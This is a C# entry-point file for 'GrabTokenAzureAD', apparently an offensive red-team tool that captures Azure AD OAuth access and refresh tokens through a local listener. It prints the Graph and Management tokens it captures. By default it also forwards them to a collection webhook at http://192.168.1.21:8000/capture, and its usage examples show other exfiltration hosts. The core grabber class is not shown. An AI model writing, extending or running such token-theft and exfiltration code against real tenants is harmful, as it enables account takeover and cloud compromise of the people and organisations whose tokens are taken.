using System;

namespace GrabTokenAzureAD
{
    class Program
    {
        static int Main(string[] args)
        {
            var config = new GrabberConfig();
            bool showHelp = false;

            for (int i = 0; i < args.Length; i++)
            {
                string arg = args[i];
                string value = (i + 1 < args.Length) ? args[i + 1] : null;

                switch (arg.ToLowerInvariant())
                {
                    case "-h":
                    case "--help":
                        showHelp = true;
                        break;
                    case "-c":
                    case "--client-id":
                        if (value != null) { config.ClientId = value; i++; }
                        break;
                    case "-t":
                    case "--tenant":
                        if (value != null) { config.Tenant = value; i++; }
                        break;
                    case "-r":
                    case "--redirect":
                        if (value != null) { config.RedirectUri = value; i++; }
                        break;
                    case "-u":
                    case "--callback":
                        if (value != null) { config.CallbackUrl = value; i++; }
                        break;
                    case "-g":
                    case "--graph-scope":
                        if (value != null) { config.GraphScope = value; i++; }
                        break;
                    case "-m":
                    case "--mgmt-scope":
                        if (value != null) { config.ManagementScope = value; i++; }
                        break;
                    case "--timeout":
                        if (value != null && int.TryParse(value, out int timeout))
                        {
                            config.ListenerTimeoutSeconds = timeout;
                            i++;
                        }
                        break;
                    case "--no-callback":
                        config.CallbackUrl = null;
                        break;
                }
            }

            if (showHelp)
            {
                PrintUsage();
                return 0;
            }

            Console.WriteLine("[*] GrabTokenAzureAD");
            Console.WriteLine($"[*] Client ID:    {config.ClientId}");
            Console.WriteLine($"[*] Tenant:       {config.Tenant}");
            Console.WriteLine($"[*] Redirect URI: {config.RedirectUri}");
            Console.WriteLine($"[*] Callback URL: {config.CallbackUrl ?? "(disabled)"}");
            Console.WriteLine();

            using (var grabber = new AzureTokenGrabber(config))
            {
                grabber.OnStatus += (s, msg) => Console.WriteLine($"[*] {msg}");
                grabber.OnTokenCaptured += (s, token) =>
                {
                    Console.WriteLine($"[+] Captured {token.Resource} token");
                    Console.WriteLine($"    Expires in: {token.ExpiresIn}s");
                    if (!string.IsNullOrEmpty(token.RefreshToken))
                        Console.WriteLine($"    Has refresh token: yes");
                };

                var result = grabber.GrabTokens();

                if (result.Success)
                {
                    Console.WriteLine();
                    Console.WriteLine("[+] Token capture successful!");

                    if (result.GraphToken?.IsSuccess == true)
                    {
                        Console.WriteLine();
                        Console.WriteLine("=== GRAPH ACCESS TOKEN ===");
                        Console.WriteLine(result.GraphToken.AccessToken);
                    }

                    if (result.ManagementToken?.IsSuccess == true)
                    {
                        Console.WriteLine();
                        Console.WriteLine("=== MANAGEMENT ACCESS TOKEN ===");
                        Console.WriteLine(result.ManagementToken.AccessToken);
                    }

                    if (result.GraphToken?.RefreshToken != null)
                    {
                        Console.WriteLine();
                        Console.WriteLine("=== REFRESH TOKEN ===");
                        Console.WriteLine(result.GraphToken.RefreshToken);
                    }

                    return 0;
                }
                else
                {
                    Console.WriteLine($"[-] Error: {result.Error}");
                    return 1;
                }
            }
        }

        static void PrintUsage()
        {
            Console.WriteLine(@"GrabTokenAzureAD - Azure OAuth Token Capture Tool

Usage: GrabTokenAzureAD.exe [options]

Options:
  -c, --client-id <id>      Azure AD client/application ID
                            Default: 1950a258-227b-4e31-a9cf-717495945fc2
                            (Azure PowerShell)

  -t, --tenant <tenant>     Azure AD tenant ID or 'common'
                            Default: common

  -r, --redirect <uri>      OAuth redirect URI (local listener)
                            Default: http://localhost:8400

  -u, --callback <url>      ANIMO webhook URL to send captured tokens
                            Default: http://192.168.1.21:8000/capture

  --no-callback             Disable sending tokens to callback URL

  -g, --graph-scope <s>     Graph API scope to request
                            Default: offline_access https://graph.microsoft.com/.default

  -m, --mgmt-scope <s>      Management API scope for refresh exchange
                            Default: https://management.azure.com/.default

  --timeout <seconds>       Browser authorization timeout
                            Default: 300

  -h, --help                Show this help message

Examples:
  # Use all defaults (Azure PowerShell client)
  GrabTokenAzureAD.exe

  # Custom callback URL
  GrabTokenAzureAD.exe -u http://10.0.0.5:8000/capture

  # Specific tenant, no callback
  GrabTokenAzureAD.exe -t contoso.onmicrosoft.com --no-callback

  # Custom client ID and redirect
  GrabTokenAzureAD.exe -c aaaaaaaa-bbbb-cccc-dddd-eeeeeeeeeeee -r http://localhost:9000
");
        }
    }
}
